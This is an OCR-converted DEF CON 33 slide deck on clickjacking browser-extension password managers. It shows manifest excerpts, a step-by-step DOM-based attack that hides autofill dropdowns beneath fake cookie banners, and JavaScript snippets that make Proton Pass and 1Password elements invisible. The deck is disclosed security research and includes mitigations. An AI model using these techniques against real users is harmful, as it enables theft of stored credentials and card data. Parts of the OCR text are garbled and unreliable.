---
title: "Browser Extension Clickjacking One Click and Your Credit Card Is Stolen"
speakers: ["Marek Tóth"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Marek Tóth - Browser Extension Clickjacking One Click and Your Credit Card Is Stolen.pdf"
pages: 166
sha256: "51242b47174366eb9c9079e11c096c9a9ed4b975a26ae4a669f17518335f98b5"
text_chars: 56315
ocr_pages: 71
has_ocr: true
redacted_secrets: 0
ocr_confidence: 83.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T07:08:08Z"
---
# Browser Extension Clickjacking One Click and Your Credit Card Is Stolen

**Speakers:** Marek Tóth  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Marek Tóth - Browser Extension Clickjacking One Click and Your Credit Card Is Stolen.pdf` (166 pages)


## Slide 1

**Browser Extension Clickjacking One Click and Your Credit Card Is Stolen**

**Marek Tóth**

## Slide 2

marektoth.com

#### **Marek Tóth**

~7 years of experience in cyber security Independent security researcher (from Czech Republic) Main focus in web application security

@marektoth @marek-toth

## Slide 3

## Slide 4


> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Not Applicable & Out of Scope Bugs
e Issues related to Way Back Machine/Web Archive
e Google Maps API Keys Leakage
e HTML Injection & Context Spoofing(Closed as NA)
```

## Slide 5


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Not Applicable & Out of Scope Bugs
e Issues related to Way Back Machine/Web Archive
e Google Maps API Keys Leakage
e HTML Injection & Context Spoofing(Closed as NA)
e Clickjacking
Report Id
| #21110 | Resolved
Severity
Disclosed
August 21, 2014, 5:13pm UTC
Weakness
UI Redressing (Clickjacking)
CVEID
None
```

## Slide 6


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Report Id
Not Applicable & Out of Scope Bugs | #21110 | Resolved
e Issues related to Way Back Machine/Web Archive
e Google Maps API Keys Leakage
e¢ HTML Injection & Context Spoofing(Closed as NA)
* Clickjacking Disclosed
August 21, 2014, 5:13pm UTC
Weakness
UI Redressing (Clickjacking)
CVEID
None
```

## Slide 7

**Security headers** : X-Frame-Options, Content-Security-Policy **SameSite cookie:** Lax, Strict


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Report Id
Not Applicable & Out of Scope Bugs | #21110, Resolved
e Issues related to Way Back Machine/Web Archive Severity
e Google Maps API Keys Leakage No rating (---)
Security headers: X-Frame-Options, Content-Security-Policy
SameSite cookie: Lax, Strict
Weakness
UI Redressing (Clickjacking)
CVEID
None
```

## Slide 8

**Clickjacking** **is not dead**

## Slide 9

## Slide 10


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
To process your reward, please send a PayPal request for $1,000.00 to
receipts@. «com. Use "Clickjacking vulnerability report submitted on Nov
13" as a reference.
unnecessary bank fees, please let us kno
receive this in (Euro, US Dollars or Swiss francs).
```

## Slide 11


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
To process your reward, please send a PayPal request for $1,000.00 to
receipts@.
com. Use "Clickjacking vulnerability report submitted on Nov
13" as a reference.
We appreciate the time that you have taken to help us improve ——---——»._ For
your efforts, | am happy to offer you a bounty of USD $ 800.00 . To avoid any
unnecessary bank fees, please let us know which currency you would prefer to
receive this in (Euro, US Dollars or Swiss francs).
Browser Extension Clickjacking: $400
Po In progress | « Submitted 23 Jun 2025 « Last activity,
a month ago
Browser Extension Clickjacking:
$500
In progress | « Submitted 09 Apr 2025 « Last
activity a month ago
```

## Slide 12


> Recovered by OCR — confidence 93/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
To process your reward, please send a PayPal request for $1,000.00 to
receipts@. com. Use "Clickjacking vulnerability report submitted on Nov
13" as a reference.
We appreciate the time that you have taken to help us improve ——---——»._ For
Severity
your efforts, | am happy to offer you a bounty of USD $ 800.00 . To avoid any High (7 ~ 8.9)
unnecessary bank fees, please let us know which currency you would prefer to
receive this in (Euro, US Dollars or Swiss francs). Weakness
UI Redressing (Clickjacking)
Browser Extension Clickjacking $400 CVEID
Po In progress | « Submitted 23 Jun 2025 « Last activity None
a month ago
Browser Extension Clickjacking:
Bounty
500
In progress | « Submitted 09 Apr 2025 « Last
activity a month ago
```

## Slide 13


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Severity
«HEEB Critical (9 ~ 10)
Weakness
UI Redressing (Clickjacking)
CVEID
None
Bounty
$10,000
```

## Slide 14

**Introduction**

## Slide 15

## **Introduction**

● **Intrusive web elements**

●

●

●

## Slide 16

## **Introduction:** Intrusive web elements

- Cookie consent banners - **1 click**

- Newsletter pop-ups, login dialog - **1 click**

-

-

## Slide 17


> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
instagram.com/weat
Allow the use of cookies from Instagram
on this browser?
We use cookies and similar technologies to help provide and improve content
on Meta Products. We also use them to provide a safer experience by using
information we receive from cookies on and off Instagram, and to provide and
improve Meta Products for people who have an account.
* Essential cookies: These cookies are required to use Meta Products and are
necessary for our sites to work as intended.
* Cookies from other companies: We use these cookies to show you ads off
of Meta Products and to provide features like maps and videos on Meta
Products. These cookies are optional.
You have control over the optional cookies we use. Learn more about cookies
and how we use them, and review or change your choices at any time in our
Cookies Policy.
About cookies
Allow all cookies
Decline optional cookies
```

## Slide 18


> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
See more from wearedefcon
See photos, videos and more from DEF CON.
Sign up for Instagram
Log in
Terms of Use and Privacy Policy
```

## Slide 19


> Recovered by OCR — confidence 90/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
é
instagram.com/wearedefcon/
Instagram
2,531 posts 54.1K followers
DEF CON
G wearedefcon
The world’s premier hacking conference
@ defcon.social/invite/nWB2S8oL + 1
DEF CON 30 Movie night DEF CON Han... DC China Day 1
705 following
```

## Slide 20

## **Introduction:** Intrusive web elements

- Cookie consent banners - **1 click**

- Newsletter pop-ups, login dialog - **1 click**

- ● Web push notifications - **1 click**

- Cloudflare challenge page / Captcha page - **1 click**

## Slide 21


> Recovered by OCR — confidence 91/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
€
@ Just a moment...
example.com
Verify you are human by completing the action below.
O Verify you are human CLOUDFLARE
example.com needs to review the security of your connection before proceeding.
Ray ID: 9677ccd0cd421e28
Performance & security by Cloudflare
```

## Slide 22

## **Introduction:** Intrusive web elements

- Cookie consent banners - **1 click**

- Newsletter pop-ups, login dialog - **1 click**

- ● Web push notifications - **1 click**

- Cloudflare challenge page / Captcha page - **1 click**

**1-3 clicks** from the user **are commonly required** before accessing content

## Slide 23

## **Introduction**

● **Intrusive web elements**

● **Clickjacking (web application)**

●

●

## Slide 24

**Introduction:** Clickjacking (web application) Clickjacking (UI redressing)

● Malicious page loads target **site in transparent iframe** (opacity:0) → users unknowingly click on the invisible target site in iframe

**<iframe** src=” **https://targetsite.com** ” style=” **opacity:0** ”> **</iframe>**

**Web clickjacking is mostly without impact →** user is not logged in cross-site iframe

## Slide 25

## **Introduction**

● **Intrusive web elements**

● **Clickjacking (web application)**

●

●

## Slide 26

## **Introduction**

● **Intrusive web elements**

● **Clickjacking (web application)**

● **Browser extension**

●

## Slide 27

## **Introduction:** Browser extension

PAGE  CONTENT  BACKGROUND
DOM
SCRIPTS SCRIPTS SCRIPTS
Web Context Extension Context

## Slide 28

## **Introduction:** Browser extension

###### **manifest.json**

- configuration file of a browser extension

- defines permissions, background scripts, content scripts…

chrome-extension:// **<extension_ID>** / **manifest.json** %LocalAppData%\Google\Chrome\User Data\ Default\Extensions\ **<extension_ID>\<version>\manifest.json**

## Slide 29


> Recovered by OCR — confidence 79/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“default_icon": {
"19": "“images/icon19.png",
"38 images/icon38.png"
“default_popup": "“popup/index.html1",
“default_title": "Bitwarden"
},
"author": "Bitwarden Inc.",
"background": {
"commands": {
"“suggested_key": {
}
“autofill_card": {
“autofill_identity": {
“autofill_login"
“suggested_key": {
42
43
44
45
46
47
48
49
51
53
54
55
56
58
61
62
77
78
79
83
84
85
86
87
88
98
91
“content_scripts": [ {
“all_frames": false,
“js": [ “content/content-message-handler.js" ],
“run_at": “document_start™
“all_frames": true,
"css": [ “content/autofill.css” ],
“exclude_matches": [ "*://*/*.xml*", "“file:///*.xml*" ],
"js": [ “content/trigger-autofill-script-injection.js” ],
“run_at": “document_start"
+1,
"“content_security_policy": {
"sandbox": “sandbox allow-scripts; script-src ‘self'"
“default_locale": "en",
“optional_permissions": [ “nativeMessaging", “privacy” ],
"permissions": [ “activeTab", “alarms”, “clipboardRead", “clipboardwWrite",
“contextMenus", "idle", “offscreen”,
“unlimitedStorage", "“webNavigation",
“notifications” ],
"sandbox": {
“pages”: [ “overlay/menu-button.html",
},
"storage": {
“webRequest", “webRequestAuthProvider",
“overlay/menu-list.html" ]
“managed_schema": "managed_schema.json"
“update_url": “https://clients2.google.com/service/update2/crx",
"version": "2025.7.0",
"web_accessible_resources": [ {
“images/icon38.png", “images/icon38_locked.png", “overlay/menu-button
“overlay/menu.html", “popup/fonts/*" ]
```

## Slide 30


> Recovered by OCR — confidence 76/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"action": {
“default_icon": {
"19": "“images/icon19.png",
"38 images/icon38.png"
“default_popup": "“popup/index.html1",
“default_title": "Bitwarden"
"background": {
“service_worker": "“background.js"
"“suggested_key": {
}
“autofill_card": {
“autofill_identity": {
“autofill_login
“suggested_key": {
I
42 }
44 “content_scripts": [ {
45 “all_frames": false,
46 “exclude_matches": [ "*://*/*.xml*", "“file:///*.xml*" ],
47 “js": [ “content/content-message-handler.js" ],
49 “run_at": “document_start"
51 “all_frames": true,
52 "css": [ “content/autofill.css” ],
53 “exclude_matches": [ "*://*/*.xml*", "“file:///*.xml*" ],
54 "js": [ “content/trigger-autofill-script-injection.js” ],
55 “matches”: [ "*://*/*", "file:///*" ],
56 “run_at": “document_start"
58 “content_security_policy": {
59 “extension_pages": “script-src ‘self’ ‘wasm-unsafe-eval'; object-src ‘self'",
60 "sandbox": “sandbox allow-scripts; script-src ‘self'"
Wh “optional_permissions": [ “nativeMessaging", “privacy” ],
78 "permissions": [ “activeTab", “alarms”, “clipboardRead", "“clipboardwrite",
“notifications” ],
79 "sandbox": {
81 },
82 "short_name": "Bitwarden",
83 "storage": {
84 “managed_schema": "managed_schema.json"
85 },
86 “update_url": “https://clients2.google.com/service/update2/crx",
838 "web_accessible_resources": [ {
89 “matches”: "\u@e3Call_urls>” J,
90) "resources": [ “content/fido2-page-script.js", “notification/bar.html",
“images/icon38.png", “images/icon38_locked.png", “overlay/menu-button
91 iJ)
```

## Slide 31

## **Introduction:** Browser extension

- Authentication persists across browser session

- Extension developer has more responsibility for security

## Slide 32

## **Introduction**

● **Intrusive web elements**

● **Clickjacking (web application)**

● **Browser extension**

● **Password Managers**

## Slide 33

Source: https://www.pcmag.com/picks/the-best-password-managers


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
= Pe | #BacktoSchoolGearGuide #ConnectedTraveler Best Products Comparisons Reviews How-To News Deals Search
PCMag editors select and review products independently. If you buy through affiliate links, we may earn commissions, which help support our testing
Home > Best Products > Security > Password Managers
The Best Password Managers for 2025
Stop using the same login credentials everywhere! The best password
managers create a unique and strong password for each of your online
accounts and alert you to potential data leaks.
By Kim Key
65 43 44,500+ ur team tests ates, and reviews more than 1,500 products each year
LOOK INSIDE PC Lags: 0
HOW WE TEST to help you make better buying decisions and get more from technology.
EXPERTS YEARS REVIEWS
Table of Contents v
PCMag has been evaluating online privacy tools for more than 30 years. We test and analyze
dozens of password managers each year, rating them primarily based on ease of adoption,
security features, and overall value. NordPass is our Editors' Choice for paid password managers
thanks to its top-notch business and premium features, while Proton Pass is our top
recommendation for free password managers. Read on for more of the best password managers
we've tested and our reasons for recommending them, followed by what to consider when
choosing the right one for you.
OUR TOP TESTED PICKS
Best Premium Password
1 Available
```

## Slide 34

Source: https://www.pcmag.com/picks/the-best-password-managers


> Recovered by OCR — confidence 92/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
4 Proton Pass
@ 1Password
U
bitwarden
[nl DASHLANE
Best Premium Password Manager
NordPass
Best Free Password Manager
Proton Pass
Best for Frequent Travelers
1Password
Best Affordable Password Manager
Bitwarden
Best Security Features
Dashlane
KEEPER
Cybersecurity Starts Here’
& Logme ERB»
Password Security with Convenience
Best Form-Filling Capabilities
RoboForm
Best for Sharing Passwords
Keeper Password Manager
& Digital Vault
@@@00 3.5Good
Best Interface
LastPass
@@@OO0 3.5Good
Best for On-Device Storage
Enpass Password
Manager
Best Digital Inheritance Options
LogMeOnce
```

## Slide 35


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
@& chrome web store Q_ Search extensions and themes
Discover Extensions Themes
@ iCloud Passwords
2.3 W (2.1K ratings) < Share
Extension Workflow & Planning 4,000,000 users
Log In
Hey you. Welcome back!
Email
= Microsoft | Edge Add-ons Discover Extensions Themes Q. Search extensions, themes, and more
Add to Chrome
iCloud Passwords
€3 Extension | Apple Inc.
WKLY (834) | 1,000,000+ Users Productivity
Log In
Hey you. Welcome back!
Email
Compatible with your browser
Version 3.1.25
Updated July 8, 2025
Available in 35 languages
```

## Slide 36

## **Password Managers:** Autofill feature

- **automatic** autofill - credentials are **automatically** filled in (0-click)

- ● **manual** autofill - user **interaction is required** to fill in credentials

(selecting from a dropdown menu)

## Slide 37

## **Introduction**

● **Intrusive web elements**

● **Clickjacking (web application)**

● **Browser extension**

● **Password Managers**

## Slide 38

**Browser Extension Clickjacking**

## Slide 39

## **Browser Extension Clickjacking**

● **IFRAME-based**

●

## Slide 40

**DEMO** 1

## Slide 41

## **web_accessible_resources**

● **publicly known** clickjacking technique

● misconfiguration in **manifest.json**

## Slide 42


> Recovered by OCR — confidence 80/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"“manifest_version": 3,
"name": "Proton Pass: Free Password Manager",
"page": "settings.html"
"web_accessible resources": [ {
"resources": [ “dropdown.html", “notification.html", "“elements.js", "assets
]
"matches": [ "\u@e3Call_urls>" ],
"resources": [ "*.wasm" ]
```

## Slide 43

#### **Manifest V2 Manifest V3**

"web_accessible_resources": [

   - "web_accessible_resources": [

- {

- {

}

- "resources": ["image.png", "script.js"]

"resources": ["image.png", "script.js"], **"matches": ["https://example.com/*"]**

]

- }

]

## Slide 44

**<iframe** src=” **chrome-extension://<extension_ID>/file.html** ” style=” **opacity:0** ”> **</iframe>**

## Slide 45

**NordPass** manifest.json (december 2023)


> Recovered by OCR — confidence 76/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
NordPass
manifest.json (december 2023)
"manifest_version": 2, ———
"name": "NordPass® Password Manager & Digital Vault",
“optional_permissions": [ “clipboardRead", “clipboardwrite" ],
“permissions”: [ "storage", “tabs", “privacy”, "contextMenus", “https://api-toggle.nordpass
"short_name": "NordPass",
"version": "5.10.20",
"web_accessible resources": [ “autofill.html", "“reportProblem.htm1", "changeFormBehaviour
» "index.html", “app.html" ]
```

## Slide 46


> Recovered by OCR — confidence 75/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Allltems Add Item
Title Last Used v
All items
swords Contact 2%
ebay.com 2a
it Cards
marektoth.cz 22
Personal Info .
Crypto Assets
@ Spotify.com 2
Shared Items
Mien] P paypal.com 22
ix £0 Elements Console Sources Network Performance Memory Application —_ Security lighthouse Recorder & >> @3 m1
<!DOCTYPE html>
<html lang="en-US">
<head> </head>
Y <body>
<script type="text/javascript" src="chrome-extension: //eiaeiblijfjekdanodkjadfinkhbfgcd/jsAndWasm/injectedPasswordless.js"></script>
```

## Slide 47

**DEMO** 2

## Slide 48

## **NordPass**

- **4 clicks** = **all NordPass items** shared with attacker - credit card, personal data, logins, passkeys - victim didn’t receive notification

reward: **10 000$**

## Slide 49

web_accessible_resources **Mitigation**

● **only necessary files** in web_accessible_resources ● whitelist domains in the matches

● set **X-Frame-Options** , **CSP** for HTML files

## Slide 50

## **Browser Extension Clickjacking**

● **IFRAME-based**

web_accessible_resources - publicly known clickjacking technique

●

## Slide 51

## **Browser Extension Clickjacking**

● **IFRAME-based**

web_accessible_resources - publicly known clickjacking technique

● **DOM-based**

## Slide 52

## **DOM-based Extension Clickjacking**

Malicious **script manipulates UI elements** that browser extensions injected into the DOM

## Slide 53

## **DOM-based Extension Clickjacking**

**<iframe> is not used**

browser extension adds element to the DOM → a user changes the element’s **visibility using javascript**

## Slide 54

**DOM-based Extension Clickjacking** transparent (opacity:0) or overlaid UI

used manual autofill feature **for increasing impact**

## Slide 55

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

## Slide 56

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

## Slide 57

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

## Slide 58

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

## Slide 59

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

## Slide 60

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

## Slide 61

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

## Slide 62

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form

   - ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

## Slide 63

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

## Slide 64

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

## Slide 65

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

## Slide 66

DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

**6.** Victim accepts/rejects cookies

## Slide 67

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

**6.** Victim accepts/rejects cookies = clicks on the invisible UI

## Slide 68

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

**6.** Victim accepts/rejects cookies = clicks on the invisible UI → **data will be filled into the created form** ( **2.** )

## Slide 69

##### DOM-based Extension Clickjacking **Password Managers**

###### JAVASCRIPT EXPLOIT CODE

**1.** Create an intrusive element (cookie consent, cloudflare captcha etc.)

**2.** Create a form (login, personal data... )

**3.** Set transparency for the form ( opacity: 0.001)

**4.** Use focus() for the form input → the autofill dropdown menu will appear

**5.** Make the UI invisible with **DOM-based Extension Clickjacking**

**6.** Victim accepts/rejects cookies = clicks on the invisible UI

   - → **data will be filled into the created form** ( **2.** )

   - → **attacker gets data from the**

   - **form values**

## Slide 70

**DOM-based Extension Clickjacking** └── **Extension Element** └── Root Element

## Slide 71


> Recovered by OCR — confidence 78/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
marektoth.com
{0 Elements Console Sources Network Performance Memory Application _ Privacy and security Lightha
<!DOCTYPE html>
<html lang="en">
> <head> @) </head>
v#shadow-root (open)
<link rel="stylesheet" href="chrome-extension://ghmbeldphafepmbegfdlkpapadhbakde/styles/styles.root.css">
frame-animation: fadein; --frame-width: 25@px; --frame-height: 6@px; --frame-zindex: 5; --frame-top: 193.
479995727539@6px; --frame-left: 610.8399963378906px; --frame-right: unset;">«)</iframe>
</protonpass-root>
```

## Slide 72


> Recovered by OCR — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
marektoth.com
Console Sources Network
fo Elements
<!DOCTYPE html>
<html lang="en">
> <head> @) </head>
v#shadow-root (open)
hrome-extension:
Performance
Memory Application _ Privacy and security Lightha
ghmbeldphafepmbegfdlkpapadhbakde/styles/styles.root.css">
ghmbeldphafepmbegfdlkpapadhbakde/dropdown.html" class="visible" style="--
frame-animation: fadein; --frame-width: 25@px; --frame-height: 6@px; --frame-zindex: 5; --frame-top: 193.
479995727539@6px; --frame-left: 610.8399963378906px; --frame-right: unset;">«)</iframe>
</protonpass-root>
```

## Slide 73

document.querySelector(" **protonpass-root** ").style. **opacity = 0.5** ;


> Recovered by OCR — confidence 80/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
in {£0 Elements Console Sources Network Performance Memory Application Privacy and security Lightho
<!DOCTYPE html>
<html lang="en">
> <head> @) </head>
Y <protonpass-root style> == $0
v#shadow-root (open)
document.querySelector("protonpass-root').style.opacity = 0.5;
protonpass-root
```

## Slide 74


> Recovered by OCR — confidence 78/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
ik [0 Elements Console Sources Network Performance Memory Application Privacy and security Lightha
<!DOCTYPE htm1>
<html lang="en">
> <head> @-») </head>
<link rel="stylesheet" href="chrome-extension://ghmbeldphafepmbegfdlkpapadhbakde/styles/styles.root.css">
><iframe src="chrome-extension: //ghmbeldphafepmbegfdlkpapadhbakde/dropdown.html" class="visible" style="--
frame-animation: fadein; --frame-width: 25@px; --frame-height: 6@px; --frame-zindex: 5; --frame-top: 193.
47999572753906px; --frame-left: 610.8399963378906px; --frame-right: unset;">«G)</iframe>
</protonpass-root>
```

## Slide 75

**DOM-based Extension Clickjacking** └── **Extension Element** ├── Root Element └── Child Element

## Slide 76


> Recovered by OCR — confidence 76/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
iframe.visible 250 x 92 eo
{0 Elements Console Sources Network Performance Memory Application _ Privacy and security Lighthous«
<!DOCTYPE html>
<html lang="en">
> <head>) </head>
<body class="my-login-page">
Y <protonpass-root-e2df data-protonpass-role="root" data-protonpass-theme="dark" popover="manual"> ( :x top-layer (1)
v#shadow-root (open)
ace ><iframe src="chrome-extension://ghmbeldphafepmbegfdlkpapadhbakde/dropdown.htm1" popover class="visible"
style="--frame-animation: fadein; --frame-width: 25@px; --frame-height: 92px; --frame-top: 181px; --frame-1
eft: 694.0400085449219px; --frame-right: unset;">---</iframe> == $0 & (Cs)
::backdrop
</protonpass-root-e2df>
> #top-layer
```

## Slide 77

// find root element const x = Array.from(document.querySelectorAll('*')) .find(el => el.tagName.toLowerCase().startsWith('protonpass-root-')); x.shadowRoot.querySelector("iframe").style.cssText += " **opacity: 0 !important;** ";

## Slide 78


> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Login Form
Username
Password
=X [0 Elements Console Sources Network Performance Memory Application Privacy and security Lighthous¢
<!DOCTYPE html>
<html lang="en">
Y <protonpass-root-e2df data-protonpass-role="root" data-protonpass-theme="dark" popover="manual"> ( < top-layer (1)
v#shadow-root (open)
style="--frame-animation: fadein; --frame-width: 25@p¥; --frame-height: 92px; --frame-topg 208.704544067382
8px; --frame-left: 803.0000610351562px; --frame-right§ unset; opacity: @ !important;">--.§/iframe> == $0
::backdrop
</protonpass-root-e2df>
> #top-layer
```

## Slide 79

**DOM-based Extension Clickjacking** └── **Extension Element** ├── Root Element └── Child Element └── **Parent Element** └── BODY

## Slide 80


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We use cookie to improve your experience
on our site. By using our site you consent
cookies.
Marektoth
username
ix LO Elements Console Sources Network
**<!DOCTYPE html> == $0
¥ <body>
Y <com-1password-button>
> #shadow-root (closed)
</com-1password-button>
Y <com-1password-menu>
> #shadow-root (closed)
</com-1password-menu>
Performanc
```

## Slide 81


> Recovered by OCR — confidence 90/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We use cookie to improve your experience
on our site. By using our site you consent
cookies.
Marektoth
username
in CO Elements Console Sources Network
Y <com-1password-button>
> #shadow-root (closed)
</com-1password-button>
Y <com-1password-menu>
> #shadow-root (closed)
</com-1password-menu>
Performanc
```

## Slide 82


> Recovered by OCR — confidence 86/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We use cookie to improve your experience
on our site. By using our site you consent
cookies.
Marektoth
username
in CO Elements Console Sources Network Performanc
**<!DOCTYPE html> == $0
Y <com-1password-button>
> #shadow-root (closed)
</com-1password-button>
Y <com-1password-menu>
> #shadow-root (closed)
</com-1password-menu>
```

## Slide 83

document. **body** .style. **opacity** = **0.2** ;


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
We use cookie to improve your experience
on our site. By using our site you consent
cookies.
Marektoth
username
in CO Elements Console Sources Network Performanc
**<!DOCTYPE html> == $0
Y <com-1password-button>
> #shadow-root (closed)
document.body.style.opacity = 0.2;
```

## Slide 84


> Recovered by OCR — confidence 77/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ix £0 Elements Console Sources Network Perform:
***<IDOCTYPE html> == $0
> <com-1password-menu> «--) </com-1password-menu>
```

## Slide 85

document. **body** .style. **opacity** = **0** ;


> Recovered by OCR — confidence 80/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
im CO Elements Console Sources Network = Perform:
<!DOCTYPE html> == $0
v<body style="opacity: 0.2;">
document.body.style.opacity = 0:
```

## Slide 86


> Recovered by OCR — confidence 70/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ix Lo Elements Console Sources Network Performar
> <head> @--) </head>
> <com-1password-button> «--) </com-1password-button>
> <com-1password-menu> ©) </com-1password-menu>
```

## Slide 87


> Recovered by OCR — confidence 71/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
im CO Elements Console Sources Network — Performar
s*e<!IDOCTYPE html> == $0
> <com-1password-button> «--) </com-1password-button>
> <com-1password-menu> ©) </com-1password-menu>
```

## Slide 88


> Recovered by OCR — confidence 70/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ix Lo Elements Console Sources Network — Performar
> <com-1password-button> «--) </com-1password-button>
> <com-1password-menu> ©) </com-1password-menu>
```

## Slide 89

